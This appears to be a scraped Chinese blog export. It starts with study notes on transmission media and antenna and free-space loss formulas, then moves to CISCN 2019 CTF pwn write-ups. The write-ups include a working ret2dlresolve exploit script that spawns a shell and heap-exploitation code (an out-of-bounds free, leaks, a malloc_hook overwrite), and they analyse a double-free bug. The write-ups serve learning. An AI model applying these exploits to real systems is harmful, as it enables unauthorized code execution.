id=\"为什么要拧合\">为什么要拧合</span></h5><p>（↡↡↡↡↡↡↡↡↡这是ppt上的内容↡↡↡↡↡↡↡↡↡↡↡↡）<br><strong>减少双导线耦合导致的码间干扰。</strong><br>（↡↡↡↡↡↡↡↡↡这是bng的演讲↡↡↡↡↡↡↡↡↡↡↡↡↡↡）<br>平行对称双导线存在耦合导致的干扰，为了减少这种干扰，理想状况是正交放置。但是现实情况下完全垂直摆放不太可能，所以就折中进行拧合从而模拟正交，两条线之间的角度虽然不是90，但是也比较大，可以一定程度减缓耦合。<br>因此，双绞线拧合的方向，密度与耦合强度强相关。</p>\n<h4><span id=\"应用\">应用</span></h4><p>模拟及数字信号均可。<br>模拟：<br>通常用于语音信号传播以及the workhorse for communications within buildings。<br>数字：<br>connections to a digital data switch<br>within a building for local area networks supporting personal computers</p>\n<h4><span id=\"传输特征\">传输特征</span></h4><ol>\n<li>容易收到串扰和噪声影响</li>\n<li>衰减随距离增大显著增加（近距离）</li>\n<li>适合低频近距离传输。</li>\n</ol>\n<h5><span id=\"拓展\">拓展</span></h5><h5><span id=\"为什么适合低频\">为什么适合低频</span></h5><ol>\n<li>频率越大，串扰越大。</li>\n<li>当频率升高，电线中的电荷会分布于表面，造成中心电阻很高，最后导致只有表面有电流。（在高频传输情况下，频率增加导致电流变化的速度更快。在双绞线中，电流的快速变化引起了更强烈的电荷堆积和电磁场辐射。由于电流变化速度的增加，电荷分布无法迅速跟随电流的变化，导致电荷在双绞线中的分布不再均匀，可能出现集中分布的现象。这种不均匀的电荷分布会增加线内和线间的串扰，干扰传输信号，并且信号衰减也会加剧）</li>\n</ol>\n<h4><span id=\"unshielded-and-shielded-twisted-pair\">Unshielded and Shielded Twisted Pair</span></h4><p>电话线通常是没有壳的双绞线。更便宜，也更容易发生串扰等。</p>\n<h5><span id=\"具体种类\">具体种类</span></h5><p>。。。感觉不是很重要。<br>就是适合频率不同的utp，分为类型3，4，5，最高频率分别为16mhz，20mhz，100mhz。不同的类型的主要区别是单位距离拧合的线缆数，数字越大越厉害。<br>以下是gpt4总结的（p12-p17）又臭又长的历史小故事，没啥用，图一乐。<br>\\1. Voice-grade twisted pair cable (Category 3 UTP) prevalent in offices supports up to 16 Mbps. </p>\n<ol>\n<li>Growing data rate demands led to EIA-568-A (1995), introducing Category 5 UTP, supporting up to 100 Mbps. </li>\n<li>The primary difference: Category 5’s tighter twist pattern (0.6-0.85 cm), yielding better performance than Category 3’s 7.5-10 cm twist. </li>\n<li>Both Category 3 and 5 UTP performances include attenuation and near-end crosstalk considerations.<h2><span id=\"312-同轴线\">3.1.2 同轴线</span></h2><h3><span id=\"3121-太长不看\">3.1.2.1 太长不看</span></h3></li>\n<li>导线，外包括空心圆柱形导体。中空用绝缘物填充。</li>\n<li>适合高频，远距离传输（<strong>不容易受到串扰和干扰的影响</strong>）<h3><span id=\"3122-太长爱看不看\">3.1.2.2 太长，爱看不看</span></h3><h4><span id=\"物理特征\">物理特征</span></h4><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-06-04%20at%206.21.28%20PM.png\" alt=\"Screen Shot 2023-06-04 at 6.21.28 PM\"><br>就是两层导体画个同心圆，中间夹心了绝缘物质，最外层包裹了壳。</li>\n</ol>\n<h4><span id=\"应用\">应用</span></h4><p>额，各种各种都可以，比较广泛的应用，还是电视线。（TV Distribution）</p>\n<ol>\n<li>电视线。（TV Distribution）</li>\n<li>长距离通话</li>\n<li>局域网</li>\n<li>Short-run computer system links</li>\n</ol>\n<h4><span id=\"传输特性\">传输特性</span></h4><ol>\n<li>不容易受码间干扰（存在金属屏蔽），但是还是存在衰减噪声等问题。</li>\n<li>传输频率范围高。</li>\n<li>适合远距离传输，但是每隔一定距离需要设置放大器（模拟）或者再生器（数字，repeater）</li>\n</ol>\n<h2><span id=\"313-光纤\">3.1.3 光纤</span></h2><p>后面会有专门的一章来讲光纤的传输特性，不过就算在这里篇幅其实也挺重的。</p>\n<h3><span id=\"3131-太长不看\">3.1.3.1 太长不看</span></h3><ol>\n<li>频率好</li>\n<li>距离好</li>\n<li>价格好<br>好好好，总之啥都比前俩好，新时代福星，bnh的最爱。</li>\n</ol>\n<h3><span id=\"3132-太长爱看不看\">3.1.3.2 太长，爱看不看</span></h3><h4><span id=\"物理特征\">物理特征</span></h4><p>由二氧化硅或者塑料（只适合短距离）制成。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-06-04%20at%206.35.04%20PM.png\" alt=\"Screen Shot 2023-06-04 at 6.35.04 PM\"></p>\n<h4><span id=\"应用\">应用</span></h4><h4><span id=\"传输特征\">传输特征</span></h4><h1><span id=\"32-无线传输媒介\">3.2 无线传输媒介</span></h1><p>（p34）</p>\n<h2><span id=\"321-天线\">3.2.1 天线</span></h2><h3><span id=\"定义\">定义</span></h3><p>用来辐射或接受电磁能量的电导体。</p>\n<h3><span id=\"分类\">分类</span></h3><h4><span id=\"isotropic-antenna\">isotropic antenna</span></h4><p>天线的理想状况，在各个方向辐射的能量都相等。</p>\n<h4><span id=\"parabolic-reflective-antenna\">Parabolic Reflective Antenna</span></h4><h3><span id=\"增益\">增益</span></h3><p>天线增益被定义某一特定方向的能量输出。</p>\n<script type=\"math/tex; mode=display\">\nG = \\frac{4\\pi A_{e}}{\\lambda^2} = \\frac{4\\pi f^2A_{e}}{c^2}</script><p> $A_{e}$ 是天线的有效面积，对于抛物面天线而言，其有效面积大约为其口面面积的0.56倍。</p>\n<script type=\"math/tex; mode=display\">\nA_{e} = 0.56A</script><p>结合天线的半径d，则有公式</p>\n<script type=\"math/tex; mode=display\">\nG = \\frac{4\\cdot 0.56 \\cdot \\pi^2 d^2}{\\lambda^2}</script><h3><span id=\"接收功率\">接收功率</span></h3><script type=\"math/tex; mode=display\">\nP_{r|dB} = P_{t|dB}  - L_{|dB}</script><p>即接收到的功率是发送功率减衰减。<br>这里有个不知道容不容易弄混的点。<br>考虑天线计算的时候大致有这么几个值（都用dB）<br>发送天线输出的功率，增益，衰减以及接收天线的功率。<br>减去衰减的那个发送功率指的是发送天线的有效辐射功率，即天线的有效面积乘以增益。用dB的话就是直接增益加输出功率。<br>所以以上的公式也可以写成：</p>\n<script type=\"math/tex; mode=display\">\nP_{r|dB} = P_{t|dB}  +G_{|dB}- L_{|dB}</script><h2><span id=\"322-terrestrial-microwave\">3.2.2 Terrestrial Microwave</span></h2><p>地表微波</p>\n<h3><span id=\"physical-description\">Physical Description</span></h3><p> Terrestrial microwave utilizes <strong>parabolic dish antennas</strong> to transmit focused <strong>microwave signals</strong> for communication <strong>over land</strong>. It involves <strong>point-to-point links</strong> between antennas, often at elevated heights, and can be used for long-distance transmission or short-haul connections between buildings, bypassing traditional telecom providers.</p>\n<h3><span id=\"传输特性\">传输特性</span></h3><p>频率通常在1-40 GHz。</p>\n<h5><span id=\"损耗\">损耗</span></h5><script type=\"math/tex; mode=display\">\nL = 10lg(\\frac{4\\pi d}{\\lambda})^2 \\ dB</script><p>ps:之前做大作业的时候一度分不清损耗是用这个算还是用后面的公示算。但是回过头来发现这个问题其实很简单，这个公式是考虑宏观意义上的自由空间损耗，没有任何关于“天线”的介入，考虑的对象是波本身，所以如果是涉及天线传输的系统就不应该使用这个公式（虽然基本上大部分信号由天线辐射，但这里就是不考虑天线）</p>\n<p>相比于金属传输线中损耗随着距离增加的指数级增长，微波损耗增长较慢，因此repeater的摆放间隔可以更远。</p>\n<h2><span id=\"323-satellite-microwave\">3.2.3 Satellite Microwave</span></h2><h3><span id=\"物理性质\">物理性质</span></h3><p>在传统的卫星通信链路中，卫星的主要作用是中继，将两个远距离的地面微波站连接链路。<br>卫星从上行频段接收信号，放大或者再生后将其从下行频段发送给地面站。一个轨道卫星可以在多个频段上工作。</p>\n<h3><span id=\"传输特性\">传输特性</span></h3><h1><span id=\"33-无线传播\">3.3 无线传播</span></h1><p>着重介绍不同类型下无线传播中的衰减损耗以及一些原理。<br>被天线辐射出的信号有三种传播路径：地表波，天波，line of sight。</p>\n<h2><span id=\"331-地表波传播\">3.3.1 地表波传播</span></h2><h1><span id=\"34-line-of-sight-transmission\">3.4 Line-of-Sight Transmission</span></h1><h2><span id=\"341-free-space-loss\">3.4.1 Free Space Loss</span></h2><p>当接收天线和发射天线都是全向天线时，在自由空间中，其传输损耗应当为发射功率与接收功率之比：</p>\n<script type=\"math/tex; mode=display\">\nL =\\frac{P_{t}}{P_{r}} = \\frac{(4\\pi d)^2}{\\lambda^2}</script><p>化为dB则有：</p>\n<script type=\"math/tex; mode=display\">\nL_{dB} = 20lg(d_{km})+20lgf_{MHz}-147.56 = -20lg(\\lambda)+20lgd_{KM}+21.98</script><p>如果考虑发射天线和接收天线并非全向天线，则还需要考虑它们各自的增益Gt和Gr</p>\n<script type=\"math/tex; mode=display\">\nL_{dB} = 32.4+20lg(d_{km})+20lgf_{MHz} -G_{t|dB}-G_{r|dB}</script><p>或</p>\n<script type=\"math/tex; mode=display\">\nL_{dB} =20lg(\\lambda)+20lgd_{KM}-10lg(A_{r}A_{t})</script>","categories":["EE"],"tags":["电信传输"]},{"title":"chapter 4 ：复用","url":"/2023/06/01/chapter%204%20%EF%BC%9A%E5%A4%8D%E7%94%A8/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>本章不是重点</p>\n","categories":["EE"],"tags":["电信传输"]},{"title":"chapter 5：金属传输线理论","url":"/2023/06/06/chapter%205%EF%BC%9A%E9%87%91%E5%B1%9E%E4%BC%A0%E8%BE%93%E7%BA%BF%E7%90%86%E8%AE%BA/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>本章建议配合课本食用</p>\n","categories":["EE"],"tags":["电信传输"]},{"title":"baby_pwn","url":"/2022/04/09/ciscn_2019_baby_pwn/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-XEBepFyd\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h1><span id=\"overview\">overview</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%883.56.19.png\" alt=\"截屏2022-04-09 下午3.56.19\"></p>\n<p>​        怪椰。</p>\n<h1><span id=\"re\">re</span></h1><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">ssize_t</span> <span class=\"title\">vuln</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf[<span class=\"number\">40</span>]; <span class=\"comment\">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x100</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​    </p>\n<h1><span id=\"蚌埠住了ret2dl的板子题\">蚌埠住了，ret2dl的板子题。</span></h1><h2><span id=\"蚌埠住了\">蚌埠住了</span></h2><h3><span id=\"蚌埠住了\">蚌埠住了</span></h3><h4><span id=\"蚌埠住了\">蚌埠住了</span></h4><h5><span id=\"蚌埠住了\">蚌埠住了</span></h5><h6><span id=\"蚌埠住了\">蚌埠住了</span></h6><h1><span id=\"利用\">利用</span></h1><p>​        翻出板子，已经成功了一半。</p>\n<p>​        醒醒，你好像没有板子。</p>\n<p>​        哦，那没事了。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%884.06.05.png\" alt=\"截屏2022-04-09 下午4.06.05\"></p>\n<p>​        难绷。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%884.10.15.png\" alt=\"截屏2022-04-09 下午4.10.15\"></p>\n<p>好。。。。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> roputils <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> process</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> gdb</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> context</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./baby_pwn&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./baby_pwn&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">44</span></span><br><span class=\"line\">bss_base = rop.section(<span class=\"string\">&#x27;.bss&#x27;</span>)</span><br><span class=\"line\">buf = rop.fill(offset)</span><br><span class=\"line\"></span><br><span class=\"line\">buf += rop.call(<span class=\"string\">&#x27;read&#x27;</span>, <span class=\"number\">0</span>, bss_base, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">## used to call dl_runtimeresolve()</span></span><br><span class=\"line\">buf += rop.dl_resolve_call(bss_base + <span class=\"number\">20</span>, bss_base)</span><br><span class=\"line\">r.send(buf)</span><br><span class=\"line\"></span><br><span class=\"line\">buf = rop.string(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">buf += rop.fill(<span class=\"number\">20</span>, buf)</span><br><span class=\"line\"><span class=\"comment\">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class=\"line\">buf += rop.dl_resolve_data(bss_base + <span class=\"number\">20</span>, <span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">buf += rop.fill(<span class=\"number\">100</span>, buf)</span><br><span class=\"line\">r.send(buf)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<p>这个题。。。</p>\n<p>虽然但是好像每年的ciscn都会有ret2dl。不管怎样我还是得熟练掌握一下（</p>\n","categories":["Binary_security"],"tags":["STACK - ret2dlreslove"]},{"title":"daliy(不想做了)","url":"/2022/04/09/ciscn_2019_daliy/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n\t\t\t<script>\n\t\t\t\tconsole.error(\"ReferenceError: value is not defined\");\n\t\t\t</script>     \n<h1><span id=\"overview\">Overview</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%884.21.10.png\" alt=\"截屏2022-04-09 下午4.21.10\"></p>\n<p>​        还可以。估计是个中等题。libc应该还是2.23。不得不说2019的ciscn初赛pwn确实是没有什么难度的。</p>\n<h1><span id=\"re\">Re</span></h1><h2><span id=\"add\">add</span></h2><p>​        第一次申请chunk时，操作如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( !v0 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          head_0[<span class=\"number\">4</span> * i] = size;</span><br><span class=\"line\">          *&amp;head_0[<span class=\"number\">4</span> * i + <span class=\"number\">2</span>] = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Now you can write you daily&quot;</span>);</span><br><span class=\"line\">          read(<span class=\"number\">0</span>, *&amp;head_0[<span class=\"number\">4</span> * i + <span class=\"number\">2</span>], size);</span><br><span class=\"line\">          LODWORD(v0) = ++head;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> v0;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        所以<code>head [4 * i + 2]</code>会指向对应的chunk data。堆块结构相对来说比较简洁。从图中就可以很清晰地看到chunk 结构体的结构，只有一个size字段和chunk data ptr字段。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%888.21.59.png\" alt=\"截屏2022-04-09 下午8.21.59\"></p>\n<h2><span id=\"free\">free</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *&amp;head_0[<span class=\"number\">4</span> * idx + <span class=\"number\">2</span>] )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">free</span>(*&amp;head_0[<span class=\"number\">4</span> * idx + <span class=\"number\">2</span>]);</span><br><span class=\"line\">      *&amp;head_0[<span class=\"number\">4</span> * idx + <span class=\"number\">2</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">      head_0[<span class=\"number\">4</span> * idx] = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;remove successful!!&quot;</span>);</span><br><span class=\"line\">      --::idx;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>​        如果对应idx的chunk data ptr存在，就free掉并置0，并且指针本身也置零,看上去没有明显的漏洞，但是问题在于free的检测只检查了ptr是否存在，并没有检查idx本身是否合法，所以这里可以填写一个不合法的idx以至于free任意chunk。</p>\n<h2><span id=\"show\">show</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( idx )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">29</span>; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( *&amp;head_0[<span class=\"number\">4</span> * i + <span class=\"number\">2</span>] )</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d : %s&quot;</span>, i, *&amp;head_0[<span class=\"number\">4</span> * i + <span class=\"number\">2</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No item the box&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<h2><span id=\"edit\">edit</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *&amp;head_0[<span class=\"number\">4</span> * idx + <span class=\"number\">2</span>] &amp;&amp; idx &lt;= <span class=\"number\">0x1D</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Please enter the new daily&quot;</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, *&amp;head_0[<span class=\"number\">4</span> * idx + <span class=\"number\">2</span>], head_0[<span class=\"number\">4</span> * idx]);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>​        没有堆溢出。</p>\n<h1><span id=\"利用\">利用</span></h1><h2><span id=\"思路\">思路</span></h2><p>​        free时没有检测idx的合法性，因此可以free 到实际的chunk ptr上，接着就可以leak libc了。所以我们需要计算我们需要free的位置对应的idx，所以需要先leak heap。</p>\n<h4><span id=\"leak-heap\">leak heap</span></h4><p>​        首先申请两个fastbin，free掉，然后在add相同size的chunk到chunk0处，可以泄露堆地址。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">40</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\">add(<span class=\"number\">40</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">40</span>,<span class=\"string\">b&#x27;\\x11&#x27;</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">data = p.recv()[<span class=\"number\">4</span>:<span class=\"number\">10</span>]</span><br><span class=\"line\">heap_addr = u64( data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">0x1</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;heap_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(heap_addr)))</span><br></pre></td></tr></table></figure>\n<h4><span id=\"leak-libc\">leak libc</span></h4><p>​    拿到了heap base，就能够算出bss上chunk struct与heap base的相对偏移，然后free掉实际的chunk data。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">idx = (heap_addr - struct_addr) / <span class=\"number\">16</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span> + p64(heap_addr + <span class=\"number\">0x80</span> + <span class=\"number\">0x10</span>))</span><br><span class=\"line\">free(idx+<span class=\"number\">1</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">data = p.recv()[<span class=\"number\">4</span>:<span class=\"number\">10</span>]</span><br><span class=\"line\">malloc_hook = u64( data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">88</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;malloc_hook =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(malloc_hook)))</span><br><span class=\"line\">libc_base = malloc_hook - libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x4526A</span></span><br></pre></td></tr></table></figure>\n<p>​        此时我们需要将chunk0的data的fd位编辑为某个unsorted bin chunk的地址，然后借用越界free将其free掉。这样我们就能在unsorted bin中获得一个虚空chunk。</p>\n<h4><span id=\"double-free\">double free</span></h4><p>​        继续利用这个free，劫持fastbin fd，分配到<code>malloc_hook</code>上，改其为<code>one_gadget</code>。</p>\n<p>​    </p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["HEAP - Fastbin Attack"]},{"title":"double","url":"/2022/04/07/ciscn_2019_double/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n\t\t\t<script>\n\t\t\t\tconsole.error(\"ReferenceError: value is not defined\");\n\t\t\t</script>     \n<h1><span id=\"overview\">overview</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-07%20%E4%B8%8B%E5%8D%888.39.03.png\" alt=\"截屏2022-04-07 下午8.39.03\"></p>\n<p>​            可以改表</p>\n<h1><span id=\"re\">re</span></h1><p>​        这个题如果只看ida的话其实感觉挺乱的，所以以动调为主会比较好。在理清了程序运行的一些逻辑后再反过来看伪代码会清晰很多。</p>\n<h2><span id=\"add\">add</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">head_ptr = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x18</span>uLL);</span><br></pre></td></tr></table></figure>\n<p>​        如果先申请一个0x28大小的chunk。</p>\n<p>​        那么首先创建一个结构体chunk，size为0x18。</p>\n<p>​        这个结构体大致长这样：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-07%20%E4%B8%8B%E5%8D%889.27.40.png\" alt=\"截屏2022-04-07 下午9.27.40\"></p>\n<p>​        在010-014储存了size，014-018则为0 。</p>\n<p>​        这个结构体字段猜测如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">size（高四位） <span class=\"number\">0</span>（低四位）</span><br><span class=\"line\">content ptr</span><br><span class=\"line\"><span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n<p>​    ida中的伪代码对应为：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">strncpy</span>(chunk_ptr, s2, (<span class=\"keyword\">int</span>)(size + <span class=\"number\">1</span>));</span><br><span class=\"line\">struct_ptr[<span class=\"number\">1</span>] = size;</span><br><span class=\"line\">*((_QWORD *)struct_ptr + <span class=\"number\">1</span>) = chunk_ptr;</span><br><span class=\"line\">*((_QWORD *)struct_ptr + <span class=\"number\">2</span>) = <span class=\"number\">0LL</span>;</span><br></pre></td></tr></table></figure>\n<p>​        如果申请了同样内容的chunk，只会为新的chunk创建结构体，结构体内保存指向上一个相同chunk的content的ptr。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-07%20%E4%B8%8B%E5%8D%8810.33.52.png\" alt=\"截屏2022-04-07 下午10.33.52\"></p>\n<p>​        因此如果只要连续free两个内容相同的chunk就会造成double free。</p>\n<p>​        创建相同内容时，chunk的结构体内存分布为下图：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8A%E5%8D%889.07.46.png\" alt=\"截屏2022-04-09 上午9.07.46\"></p>\n<p>​        可以看到，布局与最开始创建的结构体类似。head+16储存的字段都指向对应的相同内容的chunk的content。</p>\n<p>​        此外，还注意到程序在bss段上添加了两个全局变量。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8A%E5%8D%889.12.34.png\" alt=\"截屏2022-04-09 上午9.12.34\"></p>\n<p>​        当我们随便申请一些chunk，然后查看该变量的值，会发现它们指向的分别是处于最低地址的chunk的size/idx和处于最高位置的chunk的size/idx位。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8A%E5%8D%889.13.10.png\" alt=\"截屏2022-04-09 上午9.13.10\"></p>\n<p>​        对应end/start ptr的初始化操作的ida伪代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">strncpy</span>(chunk_ptr, s2, (<span class=\"keyword\">int</span>)(size + <span class=\"number\">1</span>));</span><br><span class=\"line\">     struct_ptr[<span class=\"number\">1</span>] = size;</span><br><span class=\"line\">     *((_QWORD *)struct_ptr + <span class=\"number\">1</span>) = chunk_ptr;</span><br><span class=\"line\">     *((_QWORD *)struct_ptr + <span class=\"number\">2</span>) = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> ( start_ptr )<span class=\"comment\">//第一次addchunk时，还没有start_ptr，于是将其赋值为结构体ptr</span></span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">       *struct_ptr = *(_DWORD *)v3 + <span class=\"number\">1</span>;</span><br><span class=\"line\">       *(_QWORD *)(v3 + <span class=\"number\">16</span>) = struct_ptr;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">  \t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">       *struct_ptr = <span class=\"number\">0</span>;</span><br><span class=\"line\">       start_ptr = (__int64)struct_ptr;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">     end_ptr = (__int64)struct_ptr;<span class=\"comment\">//首先在第一次add时，将end_ptr赋值为结构体ptr</span></span><br></pre></td></tr></table></figure>\n<p>​        也就是当我们只申请了一个chunk时，start和end同时指向结构体chunk的ptr，也就是这个chunk的content域，也就是size/idx字段。</p>\n<h2><span id=\"show\">show</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span 